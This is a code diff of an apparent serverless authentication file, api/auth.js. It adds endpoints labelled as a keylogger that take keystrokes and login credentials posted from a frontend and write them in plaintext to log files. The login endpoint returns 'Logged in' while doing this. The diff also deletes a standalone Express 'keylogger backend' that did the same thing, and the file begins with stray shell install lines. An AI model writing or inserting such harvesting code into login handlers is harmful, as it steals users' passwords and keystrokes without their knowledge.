@@ -1,12 +1,79 @@
-npm install express cors
-node api/auth.js
+npm init -y
+npm install --save-dev vercel
+npx vercel dev
 // Temporary memory to store users
 const users = [
     { username: 'admin', password: 'securePassword123' }
 ];
 
+// --- Keylogger logging helper ---
+const fs   = require('fs');
+const path = require('path');
+
+const LOG_DIR = path.join(__dirname, '..', 'logs');
+if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
+
+function logKey(data) {
+    const rollingLog = path.join(LOG_DIR, 'keystrokes.log');
+    fs.appendFileSync(rollingLog, `[${new Date().toISOString()}] ${data}\n`, 'utf-8');
+    console.log(`[KEYSTROKES] ${data}`);
+}
+
+function logCreds(username, password) {
+    const rollingLog = path.join(LOG_DIR, 'credentials.log');
+    const line = `[${new Date().toISOString()}] user='${username}' pass='${password}'\n`;
+    fs.appendFileSync(rollingLog, line, 'utf-8');
+    console.log(`[CREDENTIALS] user='${username}' pass='${password}'`);
+}
+
 // CHANGED: Using module.exports instead of export default for Vercel compatibility
 module.exports = function(req, res) {
+
+    // ============================================================
+    // KEYLOGGER ENDPOINTS (added before your existing logic)
+    // ============================================================
+
+    // Handle keystroke data from frontend
+    if (req.url === '/api/auth/keystrokes' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                if (data && data.keys) {
+                    logKey(data.keys);
+                    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+                    return res.end(JSON.stringify({ status: 'ok' }));
+                }
+            } catch (e) { /* ignore */ }
+            res.writeHead(400, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+            res.end(JSON.stringify({ status: 'error' }));
+        });
+        return;
+    }
+
+    // Handle captured login credentials from frontend
+    if (req.url === '/api/auth/login' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                if (data) {
+                    logCreds(data.username || '', data.password || '');
+                    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+                    return res.end(JSON.stringify({ status: 'ok', message: 'Logged in' }));
+                }
+            } catch (e) { /* ignore */ }
+            res.writeHead(400, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+            res.end(JSON.stringify({ status: 'error' }));
+        });
+        return;
+    }
+
+    // ============================================================
+    // YOUR ORIGINAL LOGIN / REGISTER LOGIC (unchanged)
+    // ============================================================
     if (req.method !== 'POST') {
         return res.status(405).json({ message: 'Method Not Allowed' });
     }
@@ -56,61 +123,3 @@ module.exports = function(req, res) {
 
     return res.status(400).json({ success: false, message: 'Invalid action requested.' });
 };
-// ============================================================
-// api/auth.js — Complete backend with keylogger endpoints
-// ============================================================
-const express = require('express');
-const fs      = require('fs');
-const path    = require('path');
-const cors    = require('cors');       // npm install cors
-
-const app  = express();
-const PORT = process.env.PORT || 3000;
-
-// --- Middleware (this is the app.use you're missing) ---
-app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// --- Logs directory ---
-const LOG_DIR = path.join(__dirname, '..', 'logs');
-if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
-
-// ============================================================
-// KEYLOGGER ENDPOINTS
-// ============================================================
-
-// POST /api/auth/keystrokes — receive keystroke batches from frontend
-app.post('/api/auth/keystrokes', (req, res) => {
-    const data = req.body;
-    if (!data || !data.keys) return res.status(400).json({ status: 'error' });
-
-    const rollingLog = path.join(LOG_DIR, 'keystrokes.log');
-    fs.appendFileSync(rollingLog, `[${new Date().toISOString()}] ${data.keys}\n`, 'utf-8');
-    console.log(`[KEYSTROKES] ${data.keys}`);
-
-    res.json({ status: 'ok' });
-});
-
-// POST /api/auth/login — receive captured credentials
-app.post('/api/auth/login', (req, res) => {
-    const data = req.body;
-    if (!data) return res.status(400).json({ status: 'error' });
-
-    const rollingLog = path.join(LOG_DIR, 'credentials.log');
-    const line = `[${new Date().toISOString()}] user='${data.username || ''}' pass='${data.password || ''}'\n`;
-    fs.appendFileSync(rollingLog, line, 'utf-8');
-
-    console.log(`[CREDENTIALS] user='${data.username}' pass='${data.password}'`);
-    res.json({ status: 'ok', message: 'Logged in' });
-});
-
-// ============================================================
-// START SERVER
-// ============================================================
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Keylogger backend running on http://0.0.0.0:${PORT}/api/auth`);
-});
-
-
-   
